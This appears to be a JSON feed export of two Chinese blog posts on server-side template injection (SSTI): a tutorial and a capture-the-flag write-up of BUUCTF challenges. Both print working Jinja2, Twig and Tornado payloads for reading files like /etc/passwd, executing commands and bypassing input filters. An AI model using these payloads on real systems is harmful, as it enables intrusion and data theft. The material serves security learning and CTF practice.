{
    "version": "https://jsonfeed.org/version/1",
    "title": "imFanqie • All posts by \"ssti\" tag",
    "description": "学习博客",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2021/11/23/ctf/web/ssti/ctfweb-SSTI%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/",
            "url": "http://example.com/2021/11/23/ctf/web/ssti/ctfweb-SSTI%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/",
            "title": "ctfweb-SSTI服务器模板注入",
            "date_published": "2021-11-23T11:57:15.038Z",
            "content_html": "<h2 id=\"概述\"><a class=\"anchor\" href=\"#概述\">#</a> 概述</h2>\n<p>模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。与此同时，它也扩展了黑客的攻击面。除了常规的 XSS 外，注入到模板中的代码还有可能引发 RCE（远程代码执行）。通常来说，这类问题会在博客，CMS，wiki 中产生。虽然模板引擎会提供沙箱机制，攻击者依然有许多手段绕过它。在这篇文章中，我将会攻击几个模板引擎来说明该类漏洞，并展示沙箱逃逸技术。</p>\n<p><strong>在考虑进行模板注入之前，我们需要进行漏洞探测</strong></p>\n<p><span id=\"more\"></span></p>\n<h2 id=\"探测漏洞\"><a class=\"anchor\" href=\"#探测漏洞\">#</a> 探测漏洞</h2>\n<h3 id=\"1文本类\"><a class=\"anchor\" href=\"#1文本类\">#</a> 1. 文本类</h3>\n<p>大部分的模板语言支持我们输入 HTML，未经过滤的输入会产生 XSS，我们可以利用 XSS 做我们最基本的探针。</p>\n<p>例如，考虑一个包含以下易受攻击的代码的模板：</p>\n<pre><code>render('Hello ' + username)\n</code></pre>\n<p>我们可以发送如下 payload：</p>\n<pre><code>&#123;7*7&#125;\n</code></pre>\n<p>或者通过请求 URL 来测试服务器端模板的注入：</p>\n<pre><code>/?username=$&#123;7*7&#125;\n</code></pre>\n<p>如果结果输出包含 <code>Hello 49</code> ，则表明正在服务器端评估数学运算。这是服务器端模板注入漏洞的良好概念证明。</p>\n<h3 id=\"2代码类\"><a class=\"anchor\" href=\"#2代码类\">#</a> 2. 代码类</h3>\n<p>在一些环境下，用户的输入也会被当作模板的可执行代码。</p>\n<p>这种情况下，XSS 的方法就无效了。但是我们可以通过破坏 template 语句，并附加注入的 HTML 标签以确认漏洞：</p>\n<pre><code>/?greeting=data.username\n</code></pre>\n<p>在没有 XSS 的情况下，这通常会导致输出中出现空白条目（只是<strong> Hello</strong> 没有用户名），编码标签或错误消息。</p>\n<p>下一步是尝试使用通用模板语法突破该语句，并尝试在其后注入任意 HTML：</p>\n<pre><code>/?greeting=data.username&#125;&#125;&lt;tag&gt;\n</code></pre>\n<p>如果再次导致错误或空白输出，则说明使用了错误的模板语言提供的语法，或者，如果没有模板样式的语法似乎有效，则无法进行服务器端模板注入。</p>\n<p>或者，如果输出和任意 HTML 一起正确呈现，则表明存在服务器端模板注入漏洞：</p>\n<pre><code class=\"language-text\">Hello user01 &lt;tag&gt;\n</code></pre>\n<h2 id=\"确认模板\"><a class=\"anchor\" href=\"#确认模板\">#</a> 确认模板</h2>\n<p>一旦检测到模板注入潜力，下一步就是确定模板引擎。</p>\n<p>尽管有大量的模板语言，但是其中许多模板使用非常相似的语法，而这些语法是专门为不与 HTML 字符冲突而选择的。</p>\n<p>通常只需提交无效的语法就足够了，因为产生的错误消息将准确告诉您模板引擎是什么，有时甚至是哪个版本。例如，无效表达式 <code>&lt;%=foobar%&gt;</code>  从基于 Ruby 的 ERB 引擎触发以下响应：</p>\n<pre><code>(erb):1:in `&lt;main&gt;': undefined local variable or method `foobar' for main:Object (NameError)\nfrom /usr/lib/ruby/2.5.0/erb.rb:876:in `eval'\nfrom /usr/lib/ruby/2.5.0/erb.rb:876:in `result'\nfrom -e:4:in `&lt;main&gt;'\n</code></pre>\n<p>否则，需要手动测试特定于语言的不同有效负载，根据不同的运算值判断模板。常用的方法是使用来自不同模板引擎的语法注入任意数学运算。</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9waWM0LnpoaW1nLmNvbS84MC92Mi0zMzIxZjQ2ODU5YzBiZTllOTNmOWFkNzlmM2RkMWNkM18xNDQwdy5qcGc=\">https://pic4.zhimg.com/80/v2-3321f46859c0be9e93f9ad79f3dd1cd3_1440w.jpg</span>&quot;alt=&quot; 决策树 &quot;style=&quot;zoom: 67%;&quot; /&gt;</p>\n<p>这里的绿线表示结果成功返回，红线反之。</p>\n<p>相同的有效负载有时可能会以一种以上的模板语言返回成功的响应。例如有效负载 <code>&#123; &#123;7*'7'&#125; &#125;</code>  在 Twig 中返回<strong> 49</strong>，在 Jinja2 中返回<strong> 7777777</strong>。</p>\n<h2 id=\"漏洞利用\"><a class=\"anchor\" href=\"#漏洞利用\">#</a> 漏洞利用</h2>\n<h3 id=\"1读文档\"><a class=\"anchor\" href=\"#1读文档\">#</a> <strong>1. 读文档</strong></h3>\n<p>读模板文献是构造 exp 的第一步。一般来讲，我们需要关注如下部分：</p>\n<ul>\n<li>'Template 使用手册 '，这一部分通常告诉我们基本的模板语法</li>\n<li>' 安全问题 '，在攻击模板时，它通常可以提供我们许多思路</li>\n<li>内建方法，函数，变量，过滤器</li>\n<li>插件 / 扩展 —— 我们可以优先研究默认开启的</li>\n</ul>\n<h3 id=\"2探环境\"><a class=\"anchor\" href=\"#2探环境\">#</a> <strong>2. 探环境</strong></h3>\n<p>当我们构建出了可用 exp 后，我们需要考虑我们当前环境可利用的函数 / 对象。除了模板默认的对象和我们提供的参数外，大部分模板引擎都有一个包含当前命名空间所有信息的对象（比如 self），或者一个可以列出所有属性和方法的函数。</p>\n<p>如果没有这样的对象或函数，我们需要暴力枚举变量名。</p>\n<p>有些时候，开发者也会在模板中包含了一些敏感信息。不过这视情况而定，因此不在这里讨论。</p>\n<h3 id=\"3黑程序\"><a class=\"anchor\" href=\"#3黑程序\">#</a> 3.<strong> 黑程序</strong></h3>\n<p php>有些时候，攻破一个程序不需要多少时间，比如：{php} echo id;</p>\n<p>这时，我们只需递交：</p>\n<pre><code>&lt;%\nimport os\nx=os.popen('id').read()\n%&gt;\n$&#123;x&#125;\n</code></pre>\n<p>即可</p>\n<p>但是越来越多的模板会提供安全措施（比方说沙箱，过滤）来保证安全性，因此开发模板注入后门越来越难了。</p>\n<h2 id=\"常见模板\"><a class=\"anchor\" href=\"#常见模板\">#</a> 常见模板</h2>\n<p>下图为<strong>常见模板结构</strong>：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pbWctYmxvZy5jc2RuaW1nLmNuLzIwMjAwODAzMTA0NjU3MjM3LnBuZw==\">https://img-blog.csdnimg.cn/20200803104657237.png</span>&quot; style=&quot;zoom: 50%;&quot; /&gt;</p>\n<h3 id=\"1jinja2\"><a class=\"anchor\" href=\"#1jinja2\">#</a> 1.jinja2</h3>\n<h4 id=\"常用函数\"><a class=\"anchor\" href=\"#常用函数\">#</a> <strong>常用函数</strong></h4>\n<pre><code>__dict__            保存类实例或对象实例的属性变量键值对字典\n__class__           返回类型所属的对象(返回调用的参数类型)\n__mro__             返回一个包含对象所继承的基类元组(返回类型列表)，方法在解析时按照元组的顺序解析。\n__bases__           返回该对象所继承的基类\n// __base__和__mro__都是用来寻找基类的\n\n__subclasses__      每个新类都保留了子类的引用(返回object的子类)，这个方法返回一个类中仍然可用的的引用的列表\n__init__            类的初始化方法\n__globals__         对包含函数全局变量的字典的引用\n</code></pre>\n<h4 id=\"payload\"><a class=\"anchor\" href=\"#payload\">#</a> payload</h4>\n<p>获取基本类</p>\n<pre><code>''.__class__.__mro__[2]\n&#123;&#125;.__class__.__bases__[0]\n().__class__.__bases__[0]\n[].__class__.__bases__[0]\nrequest.__class__.__mro__[8] //针对jinjia2/flask为[9]适用\n</code></pre>\n<p>获取基本类后，继续向下获取基本类 (object) 的子类</p>\n<pre><code>object.__subclasses__()\n</code></pre>\n<p>存在的子模块可以通过.index () 来进行查询，如果存在的话返回索引，直接调用即可</p>\n<pre><code>''.__class__.__mro__[2].__subclasses__().index(file)\n40\n</code></pre>\n<p>然后通过.read 读取文件即可（py2）</p>\n<pre><code>[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read() #将read() 修改为 write() 即为写文件\n</code></pre>\n<h4 id=\"payload总结\"><a class=\"anchor\" href=\"#payload总结\">#</a> <strong>payload 总结</strong></h4>\n<p><strong>python2</strong></p>\n<pre><code>&#123; &#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()&#125; &#125;                             //文件读取\n\n&#123; &#123;''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()&#125; &#125;              //文件读取\n\n&#123; &#123;()[&quot;\\x5F\\x5Fclass\\x5F\\x5F&quot;][&quot;\\x5F\\x5Fbases\\x5F\\x5F&quot;][0][&quot;\\x5F\\x5Fsubclasses\\x5F\\x5F&quot;]()[91][&quot;get\\x5Fdata&quot;](0, &quot;app\\x2Epy&quot;)&#125; &#125;                                    \n\n&#123; &#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['eval'](&quot;__import__('os').system('whoami')&quot;)&#125; &#125;               //命令执行\n\n&#123; &#123;()[&quot;\\x5F\\x5Fclass\\x5F\\x5F&quot;][&quot;\\x5F\\x5Fbases\\x5F\\x5F&quot;][0][&quot;\\x5F\\x5Fsubclasses\\x5F\\x5F&quot;]()[80][&quot;load\\x5Fmodule&quot;](&quot;os&quot;)[&quot;system&quot;](&quot;ls&quot;)&#125; &#125;\n\n&#123; &#123;request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()&#125; &#125;                               //命令执行\n</code></pre>\n<p><strong>python3</strong></p>\n<pre><code>//命令执行\n&#123; % for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' % &#125;&#123; &#123; c.__init__.__globals__['__builtins__'].eval(&quot;__import__('os').popen('id').read()&quot;) &#125; &#125;&#123; % endif % &#125;&#123; % endfor % &#125;\n//文件操作\n&#123; % for c in [].__class__.__base__.__subclasses__() % &#125;&#123; % if c.__name__=='catch_warnings' % &#125;&#123; &#123; c.__init__.__globals__['__builtins__'].open('filename', 'r').read() &#125; &#125;&#123; % endif % &#125;&#123; % endfor % &#125;\n</code></pre>\n<p>拼接查找目录</p>\n<pre><code>&#123; % for c in [].__class__.__base__.__subclasses__() % &#125;&#123; % if c.__name__=='catch_warnings' % &#125;&#123; &#123; c.__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')&#125; &#125;&#123; % endif % &#125;&#123; % endfor % &#125;\n</code></pre>\n<p>查找根目录 -------------------------------</p>\n<pre><code>&#123; % for c in [].__class__.__base__.__subclasses__() % &#125;&#123; % if c.__name__=='catch_warnings' % &#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('ls /').read()\")&#125;&#125;&#123; % endif % &#125;&#123; % endfor % &#125;\n</code></pre>\n<p><strong>开头的都是 class 什么的，说明是 python3 写的 flask。因为 py2 写的话，开头的都是 type。</strong></p>\n<p><strong>python2 下有 file 而在 python3 下已经没有了，所以是直接用 open。</strong></p>\n<p>更详细的方法查看参考链接第五条    <span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYnMuaWNodW5xaXUuY29tL3RocmVhZC00NzY4NS0xLTEuaHRtbA==\">浅析 SSTI (python 沙盒绕过)</span></p>\n<h4 id=\"常见绕过\"><a class=\"anchor\" href=\"#常见绕过\">#</a> <strong>常见绕过</strong></h4>\n<p>​\t<em><strong>1. 绕过中括号</strong></em></p>\n<p>pop () 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。</p>\n<pre><code>&gt;&gt;&gt; ''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()\n</code></pre>\n<p>在这里使用 pop 并不会真的移除，但却能返回其值，取代中括号，来实现绕过。</p>\n<p>​\t\t<em><strong>2. 过滤引号</strong></em></p>\n<p><code>request.args</code>  是 flask 中的一个属性，为返回请求的参数，这里把 <code>path</code>  当作变量名，将后面的路径传值进来，进而绕过了引号的过滤</p>\n<pre><code>&#123; &#123;().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read()&#125; &#125;&amp;pat\n</code></pre>\n<p>​\t<em><strong>3. 过滤</strong></em> { {<em><strong>或者</strong></em>}  }</p>\n<p>可以使用 { % 绕过，<br>\n <code>&#123; %  % &#125;</code>  中间可以执行 if 语句，利用这一点可以进行类似盲注的操作或者外带代码执行结果</p>\n<pre><code>&#123; % if ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/test').read()[0:1]=='p' % &#125;1&#123; % endif % &#125;\n</code></pre>\n<p>​\t<strong>4. 过滤_</strong></p>\n<p>用编码绕过</p>\n<pre><code>__class__ =&gt; \\x5f\\x5fclass\\x5f\\x5f\n</code></pre>\n<p>_ 是 \\x5f，. 是 \\x2E      如果也过滤了</p>\n<p>可以用利用 <code>request.args</code>  属性</p>\n<pre><code> &#123; &#123;''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() &#125; &#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__\n</code></pre>\n<p>将其中的 <code>request.args</code>  改为 <code>request.values</code>  则利用 post 的方式进行传参</p>\n<p>​\t<em><strong>5. 过滤.</strong></em></p>\n<p>. 在 payload 中是很重要的，但是我们依旧可以采用 attr () 绕过<br>\n举例</p>\n<pre><code>url?name=&#123; &#123;().__class__.__base__.__subclasses__[177].__init__.__globals__['__builtins__']['eval']('__import__(&quot;os&quot;).popen(&quot;ipconfig&quot;).read()')&#125; &#125;\n</code></pre>\n<p>使用 attr () 绕过：</p>\n<pre><code>&#123; &#123;()|attr('__class__')|attr('__base__')|attr('__subclasses__')()|attr('__getitem__')(177)|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__(&quot;os&quot;).popen(&quot;dir&quot;).read()')&#125; &#125;\n</code></pre>\n<p>​\t<em><strong>6. 绕过 config 参数</strong></em></p>\n<p><code>&#123; &#123;config&#125; &#125;</code>  可以获取当前设置，如果题目类似</p>\n<pre><code>app.config ['FLAG'] = os.environ.pop（'FLAG'）\n</code></pre>\n<p>那可以直接访问</p>\n<pre><code>&#123; &#123;config['FLAG']&#125; &#125;   或者   &#123; &#123;config.FLAG&#125; &#125;\n</code></pre>\n<p>得到 flag。但是如果被过滤了，则</p>\n<pre><code>&#123; &#123;self&#125; &#125; ⇒ &lt;TemplateReference None&gt;\n&#123; &#123;self.__dict__._TemplateReference__context.config&#125; &#125; \n</code></pre>\n<p>同样可以找到 config</p>\n<p>​\t<em><strong>7. 关键字过滤</strong></em></p>\n<p>base64 编码绕过<br>\n <code>__getattribute__</code> 使用实例访问属性时，调用该方法</p>\n<p>例如被过滤掉 <code>__class__</code> 关键词</p>\n<pre><code>&#123; &#123;[].__getattribute__('X19jbGFzc19f'.decode('base64')).__base__.__subclasses__()[40](&quot;/etc/passwd&quot;).read()&#125; &#125;\n</code></pre>\n<p>字符串拼接绕过</p>\n<pre><code>&#123; &#123;[].__getattribute__('__c'+'lass__').__base__.__subclasses__()[40](&quot;/etc/passwd&quot;).read()&#125; &#125; \n//不对就加join\n\n&#123; &#123;[].__getattribute__(['__c','lass__']|join).__base__.__subclasses__()[40]&#125; &#125;\n</code></pre>\n<h3 id=\"2smarty\"><a class=\"anchor\" href=\"#2smarty\">#</a> 2.smarty</h3>\n<p>Smarty 是一款 PHP 的模板语言。它使用安全模式来执行不信任的模板。它只运行 PHP 白名单里的函数，因此我们不能直接调用  system ()。然而我们可以从模板已有的类中进行任意调用。而文档表示我们可以通过 $smarty 来获取许多环境变量（比如当前变量的位置  $SCRIPT_NAME)。</p>\n<p>参考文章：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9lYjhkMDEzN2E3ZDM=\">ctf 中 smarty 介绍与例题</span></p>\n<p>smarty，应用比较少。</p>\n<h3 id=\"3twig\"><a class=\"anchor\" href=\"#3twig\">#</a> <strong>3.twig</strong></h3>\n<p><strong>文件读取</strong></p>\n<pre><code>&#123; &#123;'/etc/passwd'|file_excerpt(1,30)&#125; &#125;\n\n&#123; &#123;app.request.files.get(1).__construct('/etc/passwd','')&#125; &#125;\n&#123; &#123;app.request.files.get(1).openFile.fread(99)&#125; &#125;\n</code></pre>\n<p><strong>rce</strong></p>\n<pre><code>&#123; &#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125; &#125;&#123; &#123;_self.env.getFilter(&quot;id&quot;)&#125; &#125;   （cat /flag ）\n\n&#123; &#123;['cat /etc/passwd']|filter('system')&#125; &#125;\n\nPOST /subscribe?0=cat+/etc/passwd HTTP/1.1\n&#123; &#123;app.request.query.filter(0,0,1024,&#123;'options':'system'&#125;)&#125; &#125;\n</code></pre>\n<h3 id=\"4其他模板\"><a class=\"anchor\" href=\"#4其他模板\">#</a> 4. 其他模板</h3>\n<p>参考链接    <span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8yODgyMzkzMw==\">服务端模板注入攻击 - 知乎 (zhihu.com)</span></p>\n<p>对各个模板有讲解</p>\n<h2 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8yODgyMzkzMw==\">服务端模板注入攻击 - 知乎 (zhihu.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzI0NjgzMi5odG1s\">细说服务器端模板注入（SSTI） - FreeBuf 网络安全行业门户</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vMjAxNzUyMTFseXovcC8xMTQyNTM2OC5odG1s\">CTF SSTI (服务器模板注入) - MustaphaMond - 博客园 (cnblogs.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vY29sdW1uLzE4Nzg0NS5odG1s\">从零学习 flask 模板注入</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRpL2FydGljbGUvZGV0YWlscy8xMDc3NTI3MTc=\">SSTI 模板注入及绕过姿势 (基于 Python-Jinja2)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYnMuaWNodW5xaXUuY29tL3RocmVhZC00NzY4NS0xLTEuaHRtbA==\">浅析 SSTI (python 沙盒绕过)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NTIxMjgxL2FydGljbGUvZGV0YWlscy8xMDY2MzkxMTE=\">https://blog.csdn.net/qq_45521281/article/details/106639111</span></p>\n<p>附：读者可辅助参考的文章</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWHktLTEvcC8xMjg0MTk0MS5odG1s\">SSTI 学习</span></p>\n<hr>\n<p>END</p>\n",
            "tags": [
                "SSTI"
            ]
        },
        {
            "id": "http://example.com/2021/06/28/ctf/web/ssti/(ctfwp)buu%E4%B8%ADssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/",
            "url": "http://example.com/2021/06/28/ctf/web/ssti/(ctfwp)buu%E4%B8%ADssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/",
            "title": "(ctfwp)buu中ssti模板注入",
            "date_published": "2021-06-28T12:51:13.874Z",
            "content_html": "<p>学习文章在前一篇</p>\n<p><span id=\"more\"></span></p>\n<h1 id=\"一-护网杯-2018easy_tornado\"><a class=\"anchor\" href=\"#一-护网杯-2018easy_tornado\">#</a> 一、[护网杯 2018] easy_tornado</h1>\n<p>打开题目，只有三个链接，如图，</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjgvSnBTcm5xY3U5UXpnUmsxLnBuZw==\">https://i.loli.net/2021/06/28/JpSrnqcu9QzgRk1.png</span>&quot; alt=&quot;1.1.png&quot; style=&quot;zoom: 33%;&quot; /&gt;</p>\n<p>依次点开</p>\n<p><img data-src=\"https://i.loli.net/2021/06/28/GUD9pRAlmoFywSE.png\" alt=\"1.2.png\"></p>\n<p><img data-src=\"https://i.loli.net/2021/06/28/7girIkdaASC4O1x.png\" alt=\"1.3.png\"></p>\n<p><img data-src=\"https://i.loli.net/2021/06/28/dZghu8sTqkKbjzC.png\" alt=\"1.4.png\"></p>\n<p>根据每个网址的链接和 flag 页面的内容可以推测，flag 应该是</p>\n<pre><code>filename=/fllllllllllllag&amp;filehash=md5(cookie_secret+md5(filename))\n</code></pre>\n<p>这种格式。</p>\n<p>所以本题的关键在 cookie_secret</p>\n<p>根据第二个链接内容，百度 render 可以发现，render () 是 tornado 里的函数，可以生成 html 模板。</p>\n<p>我们对网站进行尝试注入，看是否有注入点</p>\n<pre><code>filename=/fllllllllllllag&amp;filehash=&#123;&#123;7*7&#125;&#125;\n</code></pre>\n<p><img data-src=\"https://i.loli.net/2021/06/28/Q3sXjMgDWcJ6C5P.png\" alt=\"1.5.png\"></p>\n<p>发现网页报错，但明显还能尝试注入</p>\n<pre><code>error?msg=&#123;&#123;7*7&#125;&#125;    和        error?msg=&#123;&#123;7&#125;&#125;\n</code></pre>\n<p>发现当输入 7*7 时，返回 orz；输入 7 时，返回 7</p>\n<p>说明可以注入，但 * 可能被过滤</p>\n<p>因为存在注入点，所以我们需要寻找 cookie_secret 路径</p>\n<p>百度发现，其存在位置为 handler.settings</p>\n<p><img data-src=\"https://i.loli.net/2021/06/28/qdHivX4ErBChAVl.png\" alt=\"1.6.png\"></p>\n<p>进行注入得</p>\n<p><img data-src=\"https://i.loli.net/2021/06/28/JmMcOqjIdl3gPoz.png\" alt=\"1.7.png\"></p>\n<pre><code>'cookie_secret': '3b278e82-468b-487a-8cd2-bcf53c8a19d0'&#125;\n</code></pre>\n<p>因为 md5 (filename)=md5 (/fllllllllllllag)=3bf9f6cf685a6dd8defadabfb41a03a1</p>\n<p>拼接后加密得 2bd5cf6fe358fa26518f4bca650e3a79</p>\n<p><img data-src=\"https://i.loli.net/2021/06/28/nIfBHhM9GJyP4qo.png\" alt=\"1.8.png\"></p>\n<p>最后输入 payload 进行查询，得到 flag</p>\n<pre><code>fllllllllllllag&amp;filehash=2bd5cf6fe358fa26518f4bca650e3a79\n</code></pre>\n<p><img data-src=\"https://i.loli.net/2021/06/28/YGEbvcOZQahAgXN.png\" alt=\"1.9.png\"></p>\n<p 5d8b767c-07af-46ff-831d-30e9c7f4d32b>flag</p>\n<h1 id=\"二-bjdctf2020cookie-is-so-stable\"><a class=\"anchor\" href=\"#二-bjdctf2020cookie-is-so-stable\">#</a> 二、[BJDCTF2020] Cookie is so stable</h1>\n<p>打开题目，需要输入 id，随便输入后发现找不到 flag</p>\n<p>尝试注入</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjgvZDR1ZWd0bm9aMjNNaXhzLnBuZw==\">https://i.loli.net/2021/06/28/d4uegtnoZ23Mixs.png</span>&quot; alt=&quot;2.1.png&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjgvUFFoNFhsYlNLSE5FUk9JLnBuZw==\">https://i.loli.net/2021/06/28/PQh4XlbSKHNEROI.png</span>&quot; alt=&quot;2.2.png&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<p>发现有明显的注入漏洞，又因为结构为 49 且基于 php，可以推测出模板为 twig。根据源码提示进行抓包，发现 uesr 是注入点</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjgvZkhMb1dpQjhVMXNiWWszLnBuZw==\">https://i.loli.net/2021/06/28/fHLoWiB8U1sbYk3.png</span>&quot; alt=&quot;2.3.png&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<p>直接百度或根据上一篇文章的 payload 进行注入</p>\n<pre><code>&#123;&#123;_self.env.registerUndefinedFilterCallback(\"exec\")&#125;&#125;&#123;&#123;_self.env.getFilter(\"cat /flag\")&#125;&#125;\n</code></pre>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjgvU2ptaEZheG5Jd0RlUmZRLnBuZw==\">https://i.loli.net/2021/06/28/SjmhFaxnIwDeRfQ.png</span>&quot; alt=&quot;2.4.png&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<p d7ef7d9d-6ba4-4dd5-88ec-33500d9b2ad3>得 flag</p>\n<h1 id=\"三-gyctf2020flaskapp\"><a class=\"anchor\" href=\"#三-gyctf2020flaskapp\">#</a> 三、[GYCTF2020] FlaskApp</h1>\n<p>进去是这个页面，提示里没有信息</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjgvVUhrQWR3czVaclhmZ1FiLnBuZw==\">https://i.loli.net/2021/06/28/UHkAdws5ZrXfgQb.png</span>&quot; alt=&quot;3.1.png&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<p>随便尝试后，发现加密中可以注入代码，解密就能得到值：</p>\n<p>注入 14 得 e3s3Kzd9fQ== 翻译得 14</p>\n<p>但再注入 49 时，加密得 e3s3Kjd9fQ==</p>\n<p>再解密却得</p>\n<p><img data-src=\"https://i.loli.net/2021/06/28/FkX7dReBKsACnqS.png\" alt=\"3.2.png\"></p>\n<p>说明存在过滤</p>\n<p>尝试注入查找目录</p>\n<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval(\"__import__('os').popen('ls /').read()\")&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n</code></pre>\n<p><img data-src=\"https://i.loli.net/2021/06/28/y8W4mGaiohPDg3J.png\" alt=\"3.3.png\"></p>\n<p>发现又被过滤了，于是考虑查看源码，在解密中随便输入进入 debug：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDYvMjgvYUVwWTVQU0RNbEtUd0hmLnBuZw==\">https://i.loli.net/2021/06/28/aEpY5PSDMlKTwHf.png</span>&quot; alt=&quot;3.4.png&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<p>可以发现，在输出结果时有过滤，存在于 app.py 的 waf 中，百度一下 payload，尝试读取文件</p>\n<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('app.py', 'r').read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n</code></pre>\n<p><img data-src=\"https://i.loli.net/2021/06/28/W8zvhqFBGKiSnP5.png\" alt=\"3.5.png\"></p>\n<p>找到了被过滤的字符</p>\n<p>拼接 os 和 import 构造 payload 寻找目录：</p>\n<pre><code>&#123;&#123;''.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__['__builtins__']['__imp'+'ort__']('o'+'s').listdir('/')&#125;&#125;\n</code></pre>\n<p><img data-src=\"https://i.loli.net/2021/06/28/mVvwtf8ODhnukRW.png\" alt=\"3.6.png\"></p>\n<p>然后拼接 flag，读取文件：</p>\n<pre><code>&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('/this_is_the_fl'+'ag.txt','r').read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n</code></pre>\n<p><img data-src=\"https://i.loli.net/2021/06/28/QqiFUklB1j2MESu.png\" alt=\"3.7.png\"></p>\n<p f8cc4e99-1ec3-49f2-b0be-b92686d4ff31>得到 flag</p>\n<h1 id=\"四-部分payload总结快速使用\"><a class=\"anchor\" href=\"#四-部分payload总结快速使用\">#</a> 四、部分 payload 总结，快速使用</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly8yNzQwOTA4OTExLmdpdGh1Yi5pby8yMDIxLzA2LzI4L2J1dSVFNCVCOCVBRCVFNyU5QSU4NCVFOSU4MyVBOCVFNSU4OCU4NnNzdGklRTglQTclQTMlRTklQTIlOTglRTglQkYlODclRTclQTglOEIv\">buu 中的部分 ssti 解题过程</span></p>\n<p><span class=\"exturl\" 